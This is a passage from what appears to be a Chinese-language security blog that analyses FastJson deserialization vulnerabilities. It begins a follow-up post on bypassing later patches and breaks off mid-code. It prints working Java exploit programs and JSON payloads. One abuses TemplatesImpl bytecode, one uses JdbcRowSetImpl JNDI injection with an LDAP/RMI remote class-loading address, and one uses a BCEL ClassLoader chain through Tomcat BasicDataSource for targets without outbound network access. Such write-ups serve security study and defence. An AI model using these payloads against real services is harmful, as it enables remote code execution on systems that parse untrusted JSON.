<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">test</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] convert(String path) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;File not found: &quot;</span> + path);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">            <span class="type">int</span> <span class="variable">readBytes</span> <span class="operator">=</span> fis.read(bytes);</span><br><span class="line">            <span class="keyword">if</span> (readBytes != file.length()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Failed to read the entire file: &quot;</span> + path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">classPath</span> <span class="operator">=</span> <span class="string">&quot;F:\\temporary\\Test.class&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] code= convert(classPath);</span><br><span class="line">        <span class="type">String</span> <span class="variable">evilCode_base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(code);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span></span><br><span class="line">                <span class="string">&quot;&#123;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCode_base64 + <span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#x27;_name&#x27;:&#x27;asd&#x27;,&#x27;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_tfactory&#x27;:&#123; &#125;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span> + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">ParserConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ParserConfig</span>();</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741665111732-1dd04f0a-f731-4b88-b195-368974de28ae.png"></p>
<h3 id="mlKqj">基于JdbcRowSetImpl的利用链</h3>
<h4 id="ZjhDP">分析</h4>
我们找到`JdbcRowSetImpl`类中的`connect`方法存在一个`lookup`方法，可能存在JNDI注入

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_ invoke__">connect</span>() throws SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (this.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> this.conn;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (this.<span class="title function_ invoke__">getDataSourceName</span>() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                InitialContext var1 = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">                DataSource var2 = (DataSource)var1.<span class="title function_ invoke__">lookup</span>(this.<span class="title function_ invoke__">getDataSourceName</span>());</span><br><span class="line">                <span class="keyword">return</span> this.<span class="title function_ invoke__">getUsername</span>() != <span class="literal">null</span> &amp;&amp; !this.<span class="title function_ invoke__">getUsername</span>().<span class="title function_ invoke__">equals</span>(<span class="string">&quot;&quot;</span>) ? var2.<span class="title function_ invoke__">getConnection</span>(this.<span class="title function_ invoke__">getUsername</span>(), this.<span class="title function_ invoke__">getPassword</span>()) : var2.<span class="title function_ invoke__">getConnection</span>();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(this.resBundle.<span class="title function_ invoke__">handleGetObject</span>(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).<span class="title function_ invoke__">toString</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> this.<span class="title function_ invoke__">getUrl</span>() != <span class="literal">null</span> ? DriverManager.<span class="title function_ invoke__">getConnection</span>(this.<span class="title function_ invoke__">getUrl</span>(), this.<span class="title function_ invoke__">getUsername</span>(), this.<span class="title function_ invoke__">getPassword</span>()) : <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>connect</code>方法对<code>this.getDataSourceName()</code>进行了<code>lookup</code></p>
<p>以下是<code>getDataSourceName</code>的代码，若我们可以控制dataSource，即可实现JNDI注入</p>
<p>虽然dataSource是一个私有属性，但是在本类中具有它public的setter方法，因此它是一个可控变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_ invoke__">getDataSourceName</span>() &#123;</span><br><span class="line">        <span class="keyword">return</span> dataSource;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_ invoke__">setDataSourceName</span>(String name) throws SQLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">            dataSource = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.<span class="title function_ invoke__">equals</span>(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;DataSource name cannot be empty string&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           dataSource = name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        URL = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们找<code>connect</code>方法的调用处，需要是一个getter或者是setter</p>
<p>我们找到了以下两种方法，而只有<code>setAutoCommit</code>方法是可以利用的</p>
<p>而getDatabaseMetaData不可利用的原因是</p>
<ol>
<li>返回值为<code>DatabaseMetaData</code>，不为指定类型</li>
<li>遍历getter方法需要使用<code>parseObject</code>方法，若要调用getter，则在<code>toJSON</code>方法前不能出错</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737018884738-9b76e56b-4ec4-4e2f-a931-1cd6da406537.png"></p>
<p>这里我们使用<code>setAutoCommit</code>方法，只要我们传入var1参数，这里我们可以调用<code>connect</code>方法，实现JNDI注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.conn = <span class="built_in">this</span>.connect();</span><br><span class="line">        <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="dTrkQ">实现</h4>
我用yakit的反连服务器工具来生成LDAP反连地址

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737020099338-09dc52aa-5f7b-4ccc-9cb4-fed45383e78a.png"></p>
<p>它的实现十分简单，我们需要设置三个键值对</p>
<ul>
<li>@type : com.sun.rowset.JdbcRowSetImpl</li>
<li>DataSourceName : ldap:&#x2F;&#x2F;127.0.0.1:8085&#x2F;ENbcWWGK</li>
<li>autoCommit : false</li>
</ul>
<p>我们需要设置DataSource，但是它的setter方法为DataSourceName，因此我们需要传入的是DataSourceName</p>
<p>而正如上面所说，我们想要执行connect方法，就要设置传入<code>setAutoCommit</code>的参数为false</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonJdbcRowSetImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/ENbcWWGK\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样即可使远程类加载</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737020566383-b0cfb972-0932-4411-a35c-f6ae4e255453.png"></p>
<p>rmi也是同理，依旧可以造成注入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">// RMI</span></span><br><span class="line">        <span class="comment">//initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, new RemoteObjImpl()); // JNDI 注入漏洞</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;TestRef&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737028187532-8f35b1ad-15a9-4796-be40-6ea5e1cdb7fb.png"></p>
<h2 id="vQ7Z9">不出网</h2>
<h3 id="i5BrD">基于BasicDataSource的不出网利用链</h3>
<h4 id="Axayj">分析</h4>
在出网情况下可以远程加载恶意类，如果在目标不出网的情况下，只能通过本地类加载来利用

<p>我们这里的核心是BCEL中的一个<code>ClassLoader</code>的<code>loadclass</code>，若这个类的开头命名满足<code>$$BCEL$$</code>，就会创建出一个类，并进行类加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class <span class="title function_">loadClass</span><span class="params">(String class_name, <span class="type">boolean</span> resolve)</span></span><br><span class="line">    <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">  &#123;</span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(cl == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Third try: Special request?</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span>(class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>) &gt;= <span class="number">0</span>)</span><br><span class="line">          clazz = createClass(class_name);</span><br><span class="line">        <span class="keyword">else</span> &#123; <span class="comment">// Fourth try: Load classes via repository</span></span><br><span class="line">          <span class="keyword">if</span> ((clazz = repository.loadClass(class_name)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            clazz = modifyClass(clazz);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(class_name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">byte</span>[] bytes  = clazz.getBytes();</span><br><span class="line">          cl = defineClass(class_name, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="comment">// Fourth try: Use default class loader</span></span><br><span class="line">          cl = Class.forName(class_name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(resolve)</span><br><span class="line">        resolveClass(cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    classes.put(class_name, cl);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cl;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>现在我们构造一个恶意类，用BCEL的<code>ClassLoader</code>进行类加载，并进行实例化，即可弹出计算器</p>
<p>这里使用<code>encode</code>的原因是在BCEL的<code>ClassLoader</code>的<code>loadclass</code>中，有一个方法<code>createClass</code>，其中对传入的参数进行了一次<code>decode</code>，因此我们需要手动<code>encode</code>一次才不会出错</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">    <span class="type">int</span>    <span class="variable">index</span>     <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">byte</span>[]      bytes  = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">      <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">      clazz = parser.parse();</span><br><span class="line">    &#125; </span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737023258681-e5d4eccc-abf0-4d06-a76f-94833c392181.png"></p>
<p>接下来就要找到调用该类loadclass的地方，一直向上找最终找到getter或者是setter</p>
<p>我们找到tomcat中的<code>BasicDataSource</code>类中的<code>createConnectionFactory</code></p>
<p>若<code>driverClassLoader</code>不为空，则使用该类加载器对<code>driverClassName</code>进行加载</p>
<p>而正好这两个属性都有对应的setter方法，是可控的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> ConnectionFactory <span class="title function_">createConnectionFactory</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="comment">// Load the JDBC driver class</span></span><br><span class="line">        <span class="type">Driver</span> <span class="variable">driverToUse</span> <span class="operator">=</span> <span class="built_in">this</span>.driver;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (driverToUse == <span class="literal">null</span>) &#123;</span><br><span class="line">            Class&lt;?&gt; driverFromCCL = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (driverClassName != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (driverClassLoader == <span class="literal">null</span>) &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            driverFromCCL = Class.forName(driverClassName, <span class="literal">true</span>, driverClassLoader);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> ClassNotFoundException cnfe) &#123;</span><br><span class="line">                        driverFromCCL = Thread.currentThread().getContextClassLoader().loadClass(driverClassName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception t) &#123;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;Cannot load JDBC driver class &#x27;&quot;</span> + driverClassName + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">                    logWriter.println(message);</span><br><span class="line">                    t.printStackTrace(logWriter);</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(message, t);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ......</span><br><span class="line">        <span class="keyword">return</span> driverConnectionFactory;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>现在我们向上找，知道找到可利用的getter或setter方法</p>
<p><code>createDataSource</code>方法调用了<code>createConnectionFactory</code></p>
<p><code>getconnection</code>调用了<code>createDataSource</code></p>
<p>而<code>getconnection</code>就是一个可用的getter方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> DataSource <span class="title function_">createDataSource</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        ......</span><br><span class="line">            <span class="keyword">final</span> <span class="type">ConnectionFactory</span> <span class="variable">driverConnectionFactory</span> <span class="operator">=</span> createConnectionFactory();</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">return</span> createDataSource().getConnection();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>成功加载恶意类</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737024621886-c9f5661e-28a4-4733-9e85-bcb9c8e4c444.png"></p>
<h4 id="EPEr4">实现</h4>
将`@type`设为`org.apache.tomcat.dbcp.dbcp2.BasicDataSource`，对`driverClassName`和`driverClassLoader`进行赋值，其中Name要符合`$$BCEL$$`，而Loader要通过JSON来还原一个类加载器

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sun.org.apache.bcel.internal.util.ClassLoader();</span><br><span class="line">        <span class="type">byte</span>[] bytes = convert(<span class="string">&quot;F:\\java\\RMI\\RMIServer\\target\\classes\\TestRef.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">       <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span>+code+<span class="string">&quot;\&quot;,\&quot;driverClassLoader\&quot;:\&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line">       JSON.parse(s);</span><br><span class="line">       System.out.println(code);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] convert(String path) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;File not found: &quot;</span> + path);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)) &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];</span><br><span class="line">            <span class="type">int</span> <span class="variable">readBytes</span> <span class="operator">=</span> fis.read(bytes);</span><br><span class="line">            <span class="keyword">if</span> (readBytes != file.length()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Failed to read the entire file: &quot;</span> + path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后成功利用，执行弹窗</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1737026441543-270f389a-c84c-4e73-9131-695ba2fa7fa3.png"></p>
<h2 id="a1DQ0">总结</h2>
<font style="color:rgb(80, 80, 92);">总结一下漏洞发生在反序列化的点，也就是 </font>`Obj.parse`<font style="color:rgb(80, 80, 92);"> 和 </font>`Obj.parseObject`<font style="color:rgb(80, 80, 92);"> 这里。必须的是传参要带入 class 的参数</font>

<p><font style="color:rgb(80, 80, 92);">PoC 是通过 String 传进去的，要以 </font><code>@type</code><font style="color:rgb(80, 80, 92);"> 打头</font></p>
<p><font style="color:rgb(80, 80, 92);">漏洞的原因是反序列化的时候去调用了 getter 和 setter 的方法</font></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>FastJson</tag>
      </tags>
  </entry>
  <entry>
    <title>FastJson各版本绕过分析</title>
    <url>/2025/03/13/FastJson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<h1 id="bxzet">FastJson各版本绕过分析</h1>
这篇主要是讲一下Fastjson中版本>=<font style="color:rgb(80, 80, 92);">1.2.25后补丁的绕过方式 </font>

<p><strong>tips: 都必须开启AutoTypeSupport才能成功</strong></p>
<h2 id="EeGoD">漏洞修复</h2>
想要绕过后续版本，我们就一定要知道哪里做了修改

<p>修补方案就是将<code>DefaultJSONParser.parseObject()</code>函数中的<code>TypeUtils.loadClass</code>替换为<code>checkAutoType()</code>函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741785104503-26d3ec85-4155-45e2-881d-9631568066ce.png"></p>
<h3 id="McNzR">checkAutoType()函数</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (typeName == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// autoTypeSupport默认为False</span></span><br><span class="line">    <span class="comment">// 当autoTypeSupport开启时，先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤</span></span><br><span class="line">    <span class="keyword">if</span> (autoTypeSupport || expectClass != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; acceptList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">accept</span> <span class="operator">=</span> acceptList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(accept)) &#123;</span><br><span class="line">                <span class="keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; denyList.length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">deny</span> <span class="operator">=</span> denyList[i];</span><br><span class="line">            <span class="keyword">if</span> (className.startsWith(deny)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 从Map缓存中获取类，注意这是后面版本的漏洞点</span></span><br><span class="line">    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);</span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = deserializers.findClass(typeName);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (expectClass != <span class="literal">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;type not match. &quot;</span> + typeName + <span class="string">&quot; -&gt; &quot;</span> + expectClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 